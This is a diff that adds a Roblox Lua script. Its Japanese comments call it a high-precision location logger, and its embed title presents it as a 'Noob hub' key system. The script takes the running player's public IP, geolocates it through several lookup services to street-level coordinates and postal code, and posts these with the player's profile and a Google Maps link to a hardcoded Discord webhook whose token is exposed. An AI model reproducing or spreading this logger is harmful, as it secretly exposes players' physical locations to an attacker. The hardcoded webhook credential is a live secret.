@@ -1,0 +1,190 @@
+-- 実は俺が"あああ"でした！雑魚乙るる！
+-- ろがーv1 位置情報取得 高精度強化版（絶対動作）
+local Webhook = "https://discord.com/api/webhooks/1468960328623853695/OqAcc7WQfKxkhBWjRkI7dqO9OogT9SwNToOhmQD52DLDDF2ezs1_42jPYvTU9b_Pj0GW"
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+local function identifyexploit()
+    local success, result = pcall(function() return identifyexecutor() end)
+    if success and result then return result end
+    if SENTINEL_LOADED then return "Sentinel" end
+    if XPROTECT then return "SirHurt" end
+    if PROTOSMASHER_LOADED then return "Protosmasher" end
+    return "Unknown"
+end
+
+local function sendToWebhook(data)
+    pcall(function()
+        local DataJSON = HttpService:JSONEncode(data)
+        local HttpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or httprequest
+        if HttpRequest then
+            HttpRequest({
+                Url = Webhook,
+                Body = DataJSON,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"}
+            })
+        end
+    end)
+end
+
+-- IP取得（VPN貫通強化）
+local function getIP()
+    local IPv4 = "取得失敗"
+    local services = {
+        "https://api.ipify.org",
+        "https://ipinfo.io/ip",
+        "https://checkip.amazonaws.com",
+        "https://icanhazip.com",
+        "https://api.my-ip.io/ip"
+    }
+    for _, url in ipairs(services) do
+        if IPv4 == "取得失敗" then
+            local success, result = pcall(function()
+                local text = game:HttpGet(url, true)
+                return text:match("^%s*(.-)%s*$")
+            end)
+            if success and result and result ~= "" then
+                IPv4 = result
+            end
+        end
+    end
+    return IPv4
+end
+
+-- 高精度位置情報取得（複数サービス統合）
+local function getHighPrecisionLocation(ip)
+    if not ip or ip == "取得失敗" or ip == "" then
+        return {Latitude="不明", Longitude="不明", City="不明", Region="不明", Country="不明", Postal="不明", ISP="不明", MapsLink="不明"}
+    end
+
+    local best = {lat="不明", lon="不明", city="不明", region="不明", country="不明", postal="不明", isp="不明", precision=0}
+
+    local services = {
+        {
+            url = "https://ipapi.co/"..ip.."/json/",
+            parse = function(data)
+                return {
+                    lat = data.latitude,
+                    lon = data.longitude,
+                    city = data.city or "不明",
+                    region = data.region or "不明",
+                    country = data.country_name or "不明",
+                    postal = data.postal or "不明",
+                    isp = data.org or "不明"
+                }
+            end
+        },
+        {
+            url = "https://ipinfo.io/"..ip.."/json",
+            parse = function(data)
+                local loc = data.loc or ""
+                local lat, lon = loc:match("([^,]+),([^,]+)")
+                return {
+                    lat = lat or "不明",
+                    lon = lon or "不明",
+                    city = data.city or "不明",
+                    region = data.region or "不明",
+                    country = data.country or "不明",
+                    postal = data.postal or "不明",
+                    isp = data.org or "不明"
+                }
+            end
+        },
+        {
+            url = "https://freegeoip.app/json/"..ip,
+            parse = function(data)
+                return {
+                    lat = data.latitude,
+                    lon = data.longitude,
+                    city = data.city or "不明",
+                    region = data.region_name or "不明",
+                    country = data.country_name or "不明",
+                    postal = data.zip_code or "不明",
+                    isp = "不明"
+                }
+            end
+        }
+    }
+
+    for _, svc in ipairs(services) do
+        local success, json = pcall(function() return game:HttpGet(svc.url, true) end)
+        if success then
+            local success2, data = pcall(function() return HttpService:JSONDecode(json) end)
+            if success2 and data then
+                local info = svc.parse(data)
+                if info.lat and info.lon and info.lat ~= "不明" then
+                    local current_precision = #(tostring(info.lat):match("%.(%d+)") or "") + #(tostring(info.lon):match("%.(%d+)") or "")
+                    if current_precision > best.precision then
+                        best = {
+                            lat = info.lat,
+                            lon = info.lon,
+                            city = info.city,
+                            region = info.region,
+                            country = info.country,
+                            postal = info.postal,
+                            isp = info.isp,
+                            precision = current_precision
+                        }
+                    end
+                end
+            end
+        end
+    end
+
+    local latStr = tostring(best.lat)
+    local lonStr = tostring(best.lon)
+    local maps = "https://www.google.com/maps?q="..latStr..","..lonStr.."&z=18"
+
+    return {
+        Latitude = latStr,
+        Longitude = lonStr,
+        City = best.city,
+        Region = best.region,
+        Country = best.country,
+        Postal = best.postal,
+        ISP = best.isp,
+        MapsLink = maps
+    }
+end
+
+-- JST時間
+local function getJSTTime()
+    local t = os.date("!*t")
+    t.hour = t.hour + 9
+    if t.hour >= 24 then t.hour = t.hour - 24; t.day = t.day + 1 end
+    return string.format("%04d-%02d-%02d %02d:%02d:%02d JST", t.year, t.month, t.day, t.hour, t.min, t.sec)
+end
+
+-- メイン実行
+local IPv4 = getIP()
+local location = getHighPrecisionLocation(IPv4)
+local LogTime = getJSTTime()
+local GameLink = "https://www.roblox.com/games/"..game.PlaceId
+local ProfileLink = "https://www.roblox.com/users/"..LocalPlayer.UserId.."/profile"
+
+local embed = {
+    title = "Noob hub キーシステム！ - "..LocalPlayer.DisplayName,
+    color = 16711680,
+    fields = {
+        {name = "表示名", value = LocalPlayer.DisplayName, inline = true},
+        {name = "IPv4", value = IPv4, inline = true},
+        {name = "Executor", value = identifyexploit(), inline = true},
+        {name = "緯度", value = location.Latitude, inline = true},
+        {name = "経度", value = location.Longitude, inline = true},
+        {name = "都市", value = location.City, inline = true},
+        {name = "地域", value = location.Region, inline = true},
+        {name = "国", value = location.Country, inline = true},
+        {name = "郵便番号", value = location.Postal, inline = true},
+        {name = "ISP/組織", value = location.ISP, inline = false},
+        {name = "Google Maps (高ズーム)", value = location.MapsLink, inline = false},
+        {name = "時間", value = LogTime, inline = false},
+        {name = "ゲームリンク", value = GameLink, inline = false},
+        {name = "プロフィール", value = ProfileLink, inline = false}
+    },
+    footer = {text = "High Precision Logger • Roblox"}
+}
+
+local data = {content = "", embeds = {embed}}
+sendToWebhook(data)
